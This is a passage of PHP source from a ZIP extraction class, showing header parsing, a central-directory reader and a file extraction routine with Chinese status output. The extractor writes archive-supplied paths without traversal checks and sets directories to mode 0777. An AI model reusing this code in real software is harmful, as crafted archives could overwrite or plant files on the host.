      $seconde = ($header['mtime'] & 0x001F)*2;
      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
      $month = ($header['mdate'] & 0x01E0) >> 5;
      $day = $header['mdate'] & 0x001F;
      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    } else {
      $header['mtime'] = time();
    }
    $header['stored_filename'] = $header['filename'];
    $header['status'] = 'ok';
    if (substr($header['filename'], -1) == '/')
      $header['external'] = 0x41FF0010;
    return $header;
 }

 function ReadCentralDir($zip,$zip_name){
	$size = filesize($zip_name);

	if ($size < 277) $maximum_size = $size;
	else $maximum_size=277;
	
	@fseek($zip, $size-$maximum_size);
	$pos = ftell($zip); $bytes = 0x00000000;
	
	while ($pos < $size){
		$byte = @fread($zip, 1); $bytes=($bytes << 8) | ord($byte);
		if ($bytes == 0x504b0506 or $bytes == 0x2e706870504b0506){ $pos++;break;} $pos++;
	}
	
	$fdata=fread($zip,18);
	
	$data=@unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',$fdata);
	
	if ($data['comment_size'] != 0) $centd['comment'] = fread($zip, $data['comment_size']);
	else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
	$centd['disk_entries'] = $data['disk_entries'];
	$centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
	$centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
	return $centd;
  }

 function ExtractFile($header,$to,$zip){
	$header = $this->readfileheader($zip);
	
	if(substr($to,-1)!="/") $to.="/";
	if($to=='./') $to = '';	
	$pth = explode("/",$to.$header['filename']);
	$mydir = '';
	for($i=0;$i<count($pth)-1;$i++){
		if(!$pth[$i]) continue;
		$mydir .= $pth[$i]."/";
		if((!is_dir($mydir) && @mkdir($mydir,0777)) || (($mydir==$to.$header['filename'] || ($mydir==$to && $this->total_folders==0)) && is_dir($mydir)) ){
			@chmod($mydir,0777);
			$this->total_folders ++;
			echo "目录: $mydir<br>";
		}
	}
	
	if(strrchr($header['filename'],'/')=='/') return;	

	if (!($header['external']==0x41FF0010)&&!($header['external']==16)){
		if ($header['compression']==0){
			$fp = @fopen($to.$header['filename'], 'wb');
			if(!$fp) return(-1);
			$size = $header['compressed_size'];
		
			while ($size != 0){
				$read_size = ($size < 2048 ? $size : 2048);
				$buffer = fread($zip, $read_size);
				$binary_data = pack('a'.$read_size, $buffer);
				@fwrite($fp, $binary_data, $read_size);
				$size -= $read_size;
			}
			fclose($fp);
			touch($to.$header['filename'], $header['mtime']);
		}else{
			$fp = @fopen($to.$header['filename'].'.gz','wb');
			if(!$fp) return(-1);
			$binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
			Chr(0x00), time(), Chr(0x00), Chr(3));
			
			fwrite($fp, $binary_data, 10);
			$size = $header['compressed_size'];
		
			while ($size != 0){
				$read_size = ($size < 1024 ? $size : 1024);
				$buffer = fread($zip, $read_size);
				$binary_data = pack('a'.$read_size, $buffer);
				@fwrite($fp, $binary_data, $read_size);
				$size -= $read_size;
			}
		
			$binary_data = pack('VV', $header['crc'], $header['size']);
			fwrite($fp, $binary_data,8); fclose($fp);
	
			$gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compress");
			if(!$gzp) return(-2);
			$fp = @fopen($to.$header['filename'],'wb');
			if(!$fp) return(-1);
			$size = $header['size'];
		
			while ($size != 0){
				$read_size = ($size < 2048 ? $size : 2048);
				$buffer = gzread($gzp, $read_size);
				$binary_data = pack('a'.$read_size, $buffer);
				@fwrite($fp, $binary_data, $read_size);
				$size -= $read_size;
			}
			fclose($fp); gzclose($gzp);
		
			touch($to.$header['filename'], $header['mtime']);
			@unlink($to.$header['filename'].'.gz');
			
		}
	}
	
	$this->total_files ++;
	echo "文件: $to$header[filename]<br>";
	return true;
 }
}
ob_end_flush();

?>
